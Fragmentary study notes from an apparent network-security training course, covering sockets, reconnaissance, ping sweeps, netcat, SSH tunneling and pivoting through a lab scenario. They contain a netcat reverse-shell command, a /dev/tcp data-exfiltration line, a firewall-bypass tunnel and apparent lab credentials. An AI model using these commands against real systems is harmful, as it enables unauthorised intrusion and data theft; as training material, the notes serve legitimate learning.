

Import Socket: 
  s = socket.socket(socket.FAMILY, socket.TYPE, socket.PROTOCOL)
    FAMILY Constants = AF_INET, AF_INET6,AF_UNIX
    TYPE Constants = SOCK_STREAM,SOCK_DGRAM,SOCK_RAW
    PROTO Constants = 0,IPPROTO_RAW
if you are going to create a tunnel and need to connect a socket through, change the ipaddr to the loopback and the port will be high number port on the tunnel.


Socket types:
  Stream : 
    connection orieneted and sequences; methods for connection establishment and tear-down, used with tcp,sctp,and bluetooth (protocol not needed)
  Datagram:
    connectionless; designed for quickly sending and receiving data, used with upp (Protocol not needed)
  Raw:
    Direct sending and receiving of ip packets without automatic protocol-specific formatting




------------------------------------------------------------------

4 types of recon
  active
      
  passive
      gathering info without direct interaction
      lower risk of discovery
      not as straight forward and requieres more time than active
      trying to find IP addresses and subdomains, external and 3rd party sites, people and technologies, content of interest, vulnerabilities
      whois queries, job site listings, phone numbers, google searches, passive OS fingerprinting
  internal
      sitting inside trying to find more shit inside the network
      packet sniffers ie. tcpdump, wireshark (internal passive)
      dns queries, arp reqests (internal active)
  external
      generally the start, from outside the target system
      OSINT (external passive)
          resolving hostnames to ip addresses, rfc 3912, WHOIS queries  
            DIG:
              typically between primary and secondary dns servers
              if allowed to transfer externally hostnames, IPs and IP blocks can be determined

network scanning
 #linux   for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
 #Windows for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
   
  21-23,80
  remote to local
    pen testing
  local to remote
    illegal
  local to local
    network admins
  remote to remote
    checking a lotta shit at once
    don't worry about it
  aim:
    wide range target scan
    target specific scan
  method:
    how you're scanning
    single source scan
    distributed scan

  idle scan uses zombie IP, uses another person's IP (that ou have to specify  to do the scan

  find open ports with nmap then use netcat to verify
      echo " ' | nc -v <ip> <port number>




host discover
  nmap, nc, scan scrpt, ping sweep
port discovery
  nmap, nc
port validation
  banner grabbing using nc
follow on actions based on ports found
  if 22 or 23 CONNECT and PASSIVE RECON
  IF 21 or 80 wget -r IP_ADDRESS **OR** wget -r ftp://IP_ADDRESS **OR** firefox
      eom or eog to open them


scan methodology
quick scan 21-23, 80
specific ports based on hints/clues
well knows
chinks of 2000 or first 10000
hail mary, (65535)
-----------------------------------------------------------------

day 5) 

transfering data - tftp, ftp (active/passive), sftp like ftp but with encryption of ssh, ftps, 

ftp <ip> | anonymous(free account on it if enabled) 
 wget -r <ip> | wget -r ftp://<ip>:<port> 

scp <location> <desination>
remote | scp student@<ip>: <file path> <where i want it> 
local | <where its located> student@<ip> :<where you want it> 
remote to remote | scp -3 student@<ip> :<what you want> student@<ip>:<where you want it>



port forward | scp -P 1111 student@localhost:file  <where you want it> 


netcat 
--------------
listning port must be made first 


listner
--------------
nc <ip> <port> < file.txt
nc -l -p 9001 > newfile.txt 
---------------------------
client relay 
-----------
mknod mypipe p (or) mkfifo <name> 

listners 
-------------
nc -l -l 9002 < infile (sends info) 
nc -l -p 9001 > outfile (recieves info) 


tunneling
______________________
creates ssh, then tells what port to go through 

send traffic
-----------------
nc -l -p 1111 > file.txt
cat file.txt > /dev/tcp/<ip>/<port>

requesting a shell
----------------------
nc -c /bin/sh <your ip> <any unfilterd port> 
nc -l -p <port that was unfiltered> -vvv

ssh local port forwarding
-------------------------
                                        (or host name) 
ssh -p <optional alternate port> <user>@<ip> -L <myport>: target:<Target port> -NT 

ex) ssh student@172.16.82.106 -L 1111:localhost:80 -NT (a way to access a private web server this host only has access too. if its an active webserver) 

ssh student@172.16.1.15 -L 1111:172.16.40.10:22
ssh student@localhost -p 1111 -L 2222:172.16.82.106:80 

        (9050)
ssh -D <port> -p <alt port> user@povit ip -NT   (use a 3rd praty software to figure it out; proxychains) any tcp protocoal can  be used, only forwards tcp traffic 
ex) ssh student@172.16.82.106 -D 9050 -nt 

on my box) proxychains ./network (network scan) 
          porxychains ssh student@<ip> -p


proxychains curl ftp://www.onlineftp.ch
proxychains wget -r www.espn.com
proxychains ./network

ssh student@10.10.0.40 -R 1111:localhost: 80 -nt (bypassing firewall to get traffic) 

ss -ntlp (view ports on your loop back) ss -antp (established ports)
------------------------------------------------------

search commands 
----------------------
find / -name hint* 2> /dev/null

find / -name flag* 2> /dev/null




hint on 10.50.44.211
-----------------------
You are on this workstation as Jose Cuervo, a local strongman. You have the ability to execute commands on this Pineland workstation as an actor for Pineland. Jose has a friend in Atropia that has provided him with the ability to SSH to the Allies' pivot point. You (Jose) should look into providing intel on other interesting workstations in the area controlled by Keith Mohammand, a wanted terrorist. Those workstations are not directly reachable from Atropia, but are on the same subnet as Jose's workstation which may be used to exfiltrate information. Jose also has a flag that can be found by using the find command on his system. The directory where the flag is found has been commonly used throughout the network.





 number 10 ssh 
 --------------------------------------
net4_comrade18
privet18


ssh net4_student18@localhost -p 41810 -L 41820:192.168.0.40:5555 -NT
 ssh  net4_student18@localhost -p 41820 -L 41830:172.16.0.60:23 -NT
 use telent
ssh net4_student18@192.168.0.40 -p 5555 -R 41840:localhost:22 -NT
ssh net4_student18@localhost -p 41820 -L 41850:localhost:41840 -NT
ssh net4_comrade18@localhost -p 41850 -D 9050 -NT














